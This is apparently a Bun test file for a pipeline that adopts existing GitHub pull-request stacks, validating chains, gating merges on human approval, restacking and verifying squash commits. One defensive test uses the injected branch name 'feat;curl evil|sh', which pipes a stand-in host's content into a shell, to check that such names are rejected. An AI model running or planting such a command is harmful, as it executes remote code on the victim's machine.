/**
 * Existing-stack adoption coverage. Regression proof: against the
 * pre-adoption pipeline (commit f8ac12d) the pipeline-level tests below fail
 * because the adopt input was stripped and implement-stack/open-stack (the
 * only "gh pr create" site) always rendered.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { renderWorkflow, simulate } from "smithers-orchestrator/testing";
import * as fs from "node:fs";
import type { ExecFn } from "../../pr-pipeline/lib/gh.ts";
import {
	adoptionApprovalSummary,
	assertDeclaredChain,
	mergeAdoptedStack,
	restackAdoptedPrs,
	validateAdoptedStack,
	type AdoptedPrLive,
} from "../lib/adopt.ts";
import { pollStack, type StackPr } from "../lib/poll.ts";
import { wakeProducerIntents } from "../../../v2/src/wake-producers.ts";

const testHome = fs.mkdtempSync("/tmp/stack-owner-adopt-test-");
beforeEach(() => { process.env.DECK_V2_HOME = testHome; });
afterEach(() => { fs.rmSync(`${testHome}/state`, { recursive: true, force: true }); });

const specs = [
	{ number: 11, head: "pr-11", base: "main" },
	{ number: 12, head: "pr-12", base: "pr-11" },
];
const livePr = (overrides: Partial<AdoptedPrLive>): AdoptedPrLive => ({
	number: 11, url: "https://github.com/org/repo/pull/11", state: "open", merged: false, draft: false,
	headRefName: "pr-11", headSha: "sha-11", baseRefName: "main", headRepoFullName: "org/repo",
	...overrides,
});
const liveStack = () => [livePr({}), livePr({ number: 12, url: "https://github.com/org/repo/pull/12", headRefName: "pr-12", headSha: "sha-12", baseRefName: "pr-11" })];

/** Routes `gh api <path>` by exact path; records every argv. */
const ghApi = (routes: Record<string, unknown>) => {
	const calls: string[][] = [];
	const exec: ExecFn = async (argv) => {
		calls.push(argv);
		const target = argv[argv.length - 1];
		if (target in routes) return { code: 0, stdout: JSON.stringify(routes[target]), stderr: "" };
		return { code: 0, stdout: "[]", stderr: "" };
	};
	return { exec, calls };
};
const openPrJson = (number: number, sha: string, overrides: Record<string, unknown> = {}) => ({
	number, state: "open", merged: false, title: `pr ${number}`, html_url: `https://github.com/org/repo/pull/${number}`,
	user: { login: "author" }, head: { sha }, mergeable: true, mergeable_state: "clean", ...overrides,
});
const greenChecks = { check_runs: [{ status: "completed", conclusion: "success" }] };
const approvedReviewAt = (sha: string) => [{ state: "APPROVED", submitted_at: "2026-08-01T00:00:00Z", commit_id: sha, user: { login: "captain", type: "User" } }];

describe("adoption chain validation", () => {
	test("a parent-first declared chain passes and a broken child base fails", () => {
		expect(() => assertDeclaredChain("main", specs)).not.toThrow();
		expect(() => assertDeclaredChain("main", [specs[0], { number: 12, head: "pr-12", base: "main" }])).toThrow(/broken at PR #12/);
		expect(() => assertDeclaredChain("main", [specs[0], { ...specs[0] }])).toThrow(/appears twice/);
		expect(() => assertDeclaredChain("develop", specs)).toThrow(/broken at PR #11/);
	});
	test("shell-active branch names are rejected before they reach git or an agent shell", () => {
		expect(() => assertDeclaredChain("main", [{ number: 11, head: "feat;curl evil|sh", base: "main" }])).toThrow(/unsafe branch name/);
		expect(() => assertDeclaredChain("main$(x)", specs)).toThrow(/unsafe base branch/);
	});
	test("live validation rejects wrong repo, closed-unmerged state, and head or base drift", () => {
		expect(() => validateAdoptedStack("org/repo", "main", specs, [liveStack()[0], { ...liveStack()[1], headRepoFullName: "fork/repo" }])).toThrow(/head lives in "fork\/repo"/);
		expect(() => validateAdoptedStack("org/repo", "main", specs, [{ ...liveStack()[0], state: "closed" }, liveStack()[1]])).toThrow(/state is "closed"/);
		expect(() => validateAdoptedStack("org/repo", "main", specs, [{ ...liveStack()[0], headRefName: "other" }, liveStack()[1]])).toThrow(/head branch is "other"/);
		expect(() => validateAdoptedStack("org/repo", "main", specs, [liveStack()[0], { ...liveStack()[1], baseRefName: "main" }])).toThrow(/base is "main"/);
		expect(() => validateAdoptedStack("org/repo", "main", [specs[0]], [])).toThrow(/no live PR data/);
	});
	test("an open draft is rejected before it can reach the merge gate", () => {
		expect(() => validateAdoptedStack("org/repo", "main", specs, [{ ...liveStack()[0], draft: true }, liveStack()[1]])).toThrow(/is a draft/);
	});
	test("a landed parent may retarget its child to the nearest unlanded ancestor", () => {
		const validated = validateAdoptedStack("org/repo", "main", specs, [
			{ ...liveStack()[0], state: "closed", merged: true },
			{ ...liveStack()[1], baseRefName: "main" },
		]);
		expect(validated[0].landed).toBe(true);
		expect(validated[1]).toMatchObject({ landed: false, headSha: "sha-12" });
	});
});

describe("adoption watch", () => {
	test("adoption poll withholds complete until a human approval exists (the pre-adoption poller reported complete without one)", async () => {
		const routes = {
			"repos/org/repo/pulls/11": openPrJson(11, "sha-11"),
			"repos/org/repo/commits/sha-11/check-runs": greenChecks,
		};
		const unapproved = await pollStack(ghApi(routes).exec, "org/repo", [11], "gh", { adoption: true });
		expect(unapproved.signal).toBe("idle");
		const legacy = await pollStack(ghApi(routes).exec, "org/repo", [11]);
		expect(legacy.signal).toBe("complete");
		const stale = await pollStack(ghApi({ ...routes, "repos/org/repo/pulls/11/reviews": approvedReviewAt("old-sha") }).exec, "org/repo", [11], "gh", { adoption: true });
		expect(stale.signal).toBe("idle");
		expect(stale.prs[0]?.reviewState).toBe("STALE_APPROVAL");
		const approved = await pollStack(ghApi({ ...routes, "repos/org/repo/pulls/11/reviews": approvedReviewAt("sha-11") }).exec, "org/repo", [11], "gh", { adoption: true });
		expect(approved.signal).toBe("complete");
	});
	test("a later COMMENTED note does not erase an approval, and a CHANGES_REQUESTED does", async () => {
		const routes = {
			"repos/org/repo/pulls/11": openPrJson(11, "sha-11"),
			"repos/org/repo/commits/sha-11/check-runs": greenChecks,
		};
		const commentedAfter = [...approvedReviewAt("sha-11"), { state: "COMMENTED", submitted_at: "2026-08-02T00:00:00Z", commit_id: "sha-11", user: { login: "captain", type: "User" } }];
		const stillApproved = await pollStack(ghApi({ ...routes, "repos/org/repo/pulls/11/reviews": commentedAfter }).exec, "org/repo", [11], "gh", { adoption: true });
		expect(stillApproved.signal).toBe("complete");
		const rejectedAfter = [...approvedReviewAt("sha-11"), { state: "CHANGES_REQUESTED", submitted_at: "2026-08-02T00:00:00Z", commit_id: "sha-11", user: { login: "other", type: "User" } }];
		const blocked = await pollStack(ghApi({ ...routes, "repos/org/repo/pulls/11/reviews": rejectedAfter }).exec, "org/repo", [11], "gh", { adoption: true });
		expect(blocked.signal).toBe("idle");
		expect(blocked.prs[0]?.reviewState).toBe("CHANGES_REQUESTED");
	});
	test("adoption poll flags behind or conflicting children as needs-rebase", async () => {
		const routes = {
			"repos/org/repo/pulls/11": openPrJson(11, "sha-11", { mergeable_state: "behind" }),
			"repos/org/repo/commits/sha-11/check-runs": greenChecks,
			"repos/org/repo/pulls/11/reviews": approvedReviewAt("sha-11"),
		};
		const result = await pollStack(ghApi(routes).exec, "org/repo", [11], "gh", { adoption: true });
		expect(result.signal).toBe("needs-rebase");
	});
	test("a PR closed without merging escalates and is never treated as a rebase", async () => {
		const routes = {
			"repos/org/repo/pulls/11": openPrJson(11, "sha-11", { state: "closed", mergeable: false, mergeable_state: "dirty" }),
			"repos/org/repo/commits/sha-11/check-runs": greenChecks,
			"repos/org/repo/pulls/11/reviews": approvedReviewAt("sha-11"),
		};
		const result = await pollStack(ghApi(routes).exec, "org/repo", [11], "gh", { adoption: true });
		expect(result.signal).toBe("decision-ask");
		expect(result.reason).toContain("closed without merging");
	});
	test("landed PRs are reported but not re-watched, and do not block complete", async () => {
		const { exec, calls } = ghApi({
			"repos/org/repo/pulls/11": { ...openPrJson(11, "sha-11"), state: "closed", merged: true },
			"repos/org/repo/pulls/12": openPrJson(12, "sha-12"),
			"repos/org/repo/commits/sha-12/check-runs": greenChecks,
			"repos/org/repo/pulls/12/reviews": approvedReviewAt("sha-12"),
		});
		const result = await pollStack(exec, "org/repo", [11, 12], "gh", { adoption: true });
		expect(result.signal).toBe("complete");
		expect(result.prs[0]).toMatchObject({ merged: true, mergeStateStatus: "landed" });
		expect(calls.some((argv) => argv.at(-1)?.includes("commits/sha-11"))).toBe(false);
	});
});

describe("adoption restack", () => {
	const gitExec = (failRebaseOf: string[] = []) => {
		const calls: string[][] = [];
		const exec: ExecFn = async (argv) => {
			calls.push(argv);
			const fails = argv[1] === "rebase" && argv[2] !== "--abort" && failRebaseOf.some((ref) => argv.includes(ref));
			return { code: fails ? 1 : 0, stdout: "", stderr: fails ? "conflict" : "" };
		};
		return { exec, calls };
	};
	test("rebases flagged PRs parent-first and chains the child onto the fresh parent", async () => {
		const { exec, calls } = gitExec();
		const result = await restackAdoptedPrs(exec, { worktree: "/tmp/wt", prs: specs, needsRebase: [11, 12] });
		expect(result.actions).toEqual([
			"rebased pr-11 onto origin/main and pushed with lease",
			"rebased pr-12 onto pr-11 and pushed with lease",
		]);
		const pushes = calls.filter((argv) => argv[1] === "push");
		expect(pushes.map((argv) => argv.at(-1))).toEqual(["pr-11:pr-11", "pr-12:pr-12"]);
	});
	test("touches only flagged PRs so untouched PRs keep their GitHub approvals", async () => {
		const { exec, calls } = gitExec();
		await restackAdoptedPrs(exec, { worktree: "/tmp/wt", prs: specs, needsRebase: [12] });
		expect(calls.some((argv) => argv.at(-1) === "pr-11:pr-11")).toBe(false);
		expect(calls.filter((argv) => argv[1] === "push").map((argv) => argv.at(-1))).toEqual(["pr-12:pr-12"]);
		const untouched = gitExec();
		const none = await restackAdoptedPrs(untouched.exec, { worktree: "/tmp/wt", prs: specs, needsRebase: [] });
		expect(none.actions).toEqual([]);
		expect(untouched.calls).toEqual([]);
	});
	test("a conflicting rebase is aborted, recorded, and never pushed", async () => {
		const { exec, calls } = gitExec(["origin/main"]);
		const result = await restackAdoptedPrs(exec, { worktree: "/tmp/wt", prs: specs, needsRebase: [11] });
		expect(result.conflicts).toEqual(['PR #11 (pr-11) conflicts with origin/main']);
		expect(calls.some((argv) => argv[1] === "rebase" && argv[2] === "--abort")).toBe(true);
		expect(calls.some((argv) => argv[1] === "push")).toBe(false);
	});
	test("a conflicted parent stops its descendants: no rebase onto the stale base, no useless force-push", async () => {
		const { exec, calls } = gitExec(["origin/main"]);
		const result = await restackAdoptedPrs(exec, { worktree: "/tmp/wt", prs: specs, needsRebase: [11, 12] });
		expect(result.actions).toEqual([]);
		expect(result.conflicts).toEqual([
			"PR #11 (pr-11) conflicts with origin/main",
			"PR #12 (pr-12) skipped: its base pr-11 did not rebase",
		]);
		expect(calls.some((argv) => argv[1] === "push")).toBe(false);
	});
});

describe("adoption merge", () => {
	const pollComplete = { signal: "complete" as const, reason: "ready", prs: specs.map((spec) => ({ number: spec.number, merged: false } as StackPr)) };
	test("rechecks the whole stack after approval and refuses to merge a changed stack", async () => {
		const { exec, calls } = ghApi({});
		await expect(mergeAdoptedStack({
			exec, gh: "gh", repo: "org/repo", worktree: "/tmp/wt", prs: specs,
			poll: async () => ({ signal: "idle", reason: "CI restarted", prs: [] }),
		})).rejects.toThrow(/stack changed after approval: CI restarted/);
		expect(calls.some((argv) => argv.includes("merge"))).toBe(false);
	});
	test("a head that moved after approval stops the merge even when the stack polls complete", async () => {
		const { exec, calls } = ghApi({});
		await expect(mergeAdoptedStack({
			exec, gh: "gh", repo: "org/repo", worktree: "/tmp/wt", prs: specs,
			approved: [{ number: 11, headSha: "sha-11" }, { number: 12, headSha: "sha-12" }],
			poll: async () => ({ signal: "complete", reason: "ready", prs: [{ number: 11, headSha: "sha-11", merged: false } as StackPr, { number: 12, headSha: "sha-12-moved", merged: false } as StackPr] }),
		})).rejects.toThrow(/PR #12 head moved from sha-12 to sha-12-moved after approval/);
		expect(calls.some((argv) => argv.includes("merge"))).toBe(false);
	});
	test("merges parent-first and verifies each squash commit (#N) on the actual base", async () => {
		const { exec, calls } = ghApi({
			"repos/org/repo/pulls/11": { merged: true, base: { ref: "main" } },
			"repos/org/repo/pulls/12": { merged: true, base: { ref: "main" } },
			"repos/org/repo/commits?sha=main&per_page=100": [
				{ sha: "land-12", commit: { message: "child change (#12)" } },
				{ sha: "land-11", commit: { message: "parent change (#11)" } },
			],
		});
		const receipts = await mergeAdoptedStack({ exec, gh: "gh", repo: "org/repo", worktree: "/tmp/wt", prs: specs, poll: async () => pollComplete, wait: async () => {}, attempts: 2 });
		expect(receipts).toEqual([
			"PR #11: squash land-11 landed on main",
			"PR #12: squash land-12 landed on main",
		]);
		const merges = calls.filter((argv) => argv[2] === "merge").map((argv) => argv[3]);
		expect(merges).toEqual(["11", "12"]);
	});
	test("fails loudly when the squash commit never lands on the base", async () => {
		const { exec } = ghApi({
			"repos/org/repo/pulls/11": { merged: true, base: { ref: "main" } },
			"repos/org/repo/commits?sha=main&per_page=100": [{ sha: "x", commit: { message: "unrelated" } }],
		});
		await expect(mergeAdoptedStack({ exec, gh: "gh", repo: "org/repo", worktree: "/tmp/wt", prs: [specs[0]], poll: async () => pollComplete, wait: async () => {}, attempts: 2 }))
			.rejects.toThrow(/no squash commit \(#11\)/);
	});
	test("already-landed PRs get a receipt without a merge call", async () => {
		const { exec, calls } = ghApi({
			"repos/org/repo/pulls/12": { merged: true, base: { ref: "main" } },
			"repos/org/repo/commits?sha=main&per_page=100": [{ sha: "land-12", commit: { message: "child change (#12)" } }],
		});
		const receipts = await mergeAdoptedStack({
			exec, gh: "gh", repo: "org/repo", worktree: "/tmp/wt", prs: specs,
			poll: async () => ({ ...pollComplete, prs: [{ number: 11, merged: true } as StackPr, { number: 12, merged: false } as StackPr] }),
			wait: async () => {}, attempts: 2,
		});
		expect(receipts[0]).toBe("PR #11: already landed");
		expect(calls.filter((argv) => argv[2] === "merge").map((argv) => argv[3])).toEqual(["12"]);
	});
});

describe("adoption approval evidence", () => {
	test("the summary lists every PR URL, head SHA, state, and the validation receipt path", () => {
		const rows = [
			{ number: 11, url: "https://github.com/org/repo/pull/11", headSha: "sha-11", merged: true, state: "closed", ci: "green", reviewState: "APPROVED", mergeable: true, mergeStateStatus: "landed" },
			{ number: 12, url: "https://github.com/org/repo/pull/12", headSha: "sha-12", merged: false, state: "open", ci: "green", reviewState: "APPROVED", mergeable: true, mergeStateStatus: "clean" },
		] as StackPr[];
		const summary = adoptionApprovalSummary(rows, "/tmp/receipt.json");
		expect(summary).toContain("https://github.com/org/repo/pull/11");
		expect(summary).toContain("head sha-12; state: OPEN");
		expect(summary).toContain("state: LANDED");
		expect(summary).toContain("Local validation receipt: /tmp/receipt.json");
	});
});

describe("adoption pipeline", () => {
	const adoptInput = {
		repo: "org/repo", worktree: "/tmp/worktree", branch: "feature", prompt: "Own the existing stack", dryRun: true,
		adopt: { prs: specs },
	};
	test("adoption renders neither implement-stack nor open-stack, so gh pr create cannot run (pre-adoption pipeline rendered both)", async () => {
		const rendered = await renderWorkflow((await import("../pipeline.tsx")).default, { input: adoptInput, workflowPath: new URL("../pipeline.tsx", import.meta.url).pathname });
		const ids = rendered.tasks.map((task) => task.nodeId);
		expect(ids).toContain("adopt-validate");
		expect(ids).not.toContain("implement-stack");
		expect(ids).not.toContain("open-stack");
	});
	test("adoption dry-run validates, reviews once, watches, gates on approval, and merges with squash receipts", async () => {
		const sim = simulate((await import("../pipeline.tsx")).default, { input: adoptInput });
		await sim.run();
		expect(sim.outputs.implementation).toBeUndefined();
		const validation = sim.outputs.adoptValidation?.[0] as { ok?: boolean; receiptPath?: string } | undefined;
		expect(validation?.ok).toBe(true);
		expect(fs.existsSync(String(validation?.receiptPath))).toBe(true);
		expect((sim.outputs.review ?? []).length).toBe(1);
		const opened = sim.outputs.opened?.[0] as { summary?: string; prs?: Array<{ number: number }> } | undefined;
		expect(opened?.summary).toContain("no PR was created");
		expect(opened?.prs?.map((pr) => pr.number)).toEqual([11, 12]);
		expect((sim.outputs.approval?.[0] as { approved?: boolean } | undefined)?.approved).toBe(true);
		const merge = sim.outputs.merge?.[0] as { merged?: boolean; receipts?: string[] } | undefined;
		expect(merge?.merged).toBe(true);
		expect(merge?.receipts).toEqual(["dry-run: PR #11 squash (#11) verified on its base", "dry-run: PR #12 squash (#12) verified on its base"]);
		expect((sim.outputs.result?.[0] as { done?: boolean } | undefined)?.done).toBe(true);
	});
	test("a behind child triggers an ordered restack and a re-poll of the changed heads before the gate", async () => {
		const sim = simulate((await import("../pipeline.tsx")).default, { input: { ...adoptInput, fixtures: { adoptBehind: true } } });
		await sim.run();
		const restacks = (sim.outputs.restack ?? []) as Array<{ actions?: string[] }>;
		expect(restacks.length).toBe(1);
		expect(restacks[0]?.actions).toEqual(["dry-run: rebased PR #11", "dry-run: rebased PR #12"]);
		const polls = (sim.outputs.poll ?? []) as Array<{ signal?: string; prs?: Array<{ headSha?: string }> }>;
		expect(polls[0]?.signal).toBe("needs-rebase");
		expect(polls.at(-1)?.signal).toBe("complete");
		expect(polls.at(-1)?.prs?.[0]?.headSha).toBe("dryrun-restacked-sha");
		expect((sim.outputs.result?.[0] as { done?: boolean } | undefined)?.done).toBe(true);
	});
	test("a conflicting restack escalates to a decision instead of rebasing forever", async () => {
		const sim = simulate((await import("../pipeline.tsx")).default, { input: { ...adoptInput, fixtures: { adoptBehind: true, adoptConflict: true } } });
		await sim.run();
		const polls = (sim.outputs.poll ?? []) as Array<{ signal?: string }>;
		expect(polls[0]?.signal).toBe("needs-rebase");
		expect(polls.at(-1)?.signal).toBe("decision-ask");
		expect(sim.outputs.approval).toBeUndefined();
		expect((sim.outputs.result?.[0] as { done?: boolean } | undefined)?.done).toBe(false);
		expect(wakeProducerIntents(`${testHome}/state/smithers`).some((intent) => intent.snapshot.decisionAsk === true)).toBe(true);
	});
	test("a run that ends still needing a rebase leaves a decision wake instead of clearing it", async () => {
		const sim = simulate((await import("../pipeline.tsx")).default, { input: { ...adoptInput, fixtures: { adoptBehind: true }, limits: { polls: 1 } } });
		await sim.run();
		expect(sim.outputs.approval).toBeUndefined();
		expect((sim.outputs.result?.[0] as { done?: boolean } | undefined)?.done).toBe(false);
		expect(wakeProducerIntents(`${testHome}/state/smithers`).some((intent) => intent.snapshot.decisionAsk === true)).toBe(true);
	});
	test("a red adopted stack reaches neither the gate nor the merge", async () => {
		const sim = simulate((await import("../pipeline.tsx")).default, { input: { ...adoptInput, fixtures: { ciFail: true } } });
		await sim.run();
		expect(sim.outputs.approval).toBeUndefined();
		expect(sim.outputs.merge).toBeUndefined();
		expect((sim.outputs.result?.[0] as { done?: boolean } | undefined)?.done).toBe(false);
	});
	test("an adoption review blocker stops the run before the stack is registered", async () => {
		const sim = simulate((await import("../pipeline.tsx")).default, { input: { ...adoptInput, fixtures: { finding: "stack blocker" } } });
		await sim.run();
		expect(sim.outputs.opened).toBeUndefined();
		expect(sim.outputs.merge).toBeUndefined();
		expect((sim.outputs.result?.[0] as { done?: boolean } | undefined)?.done).toBe(false);
	});
});
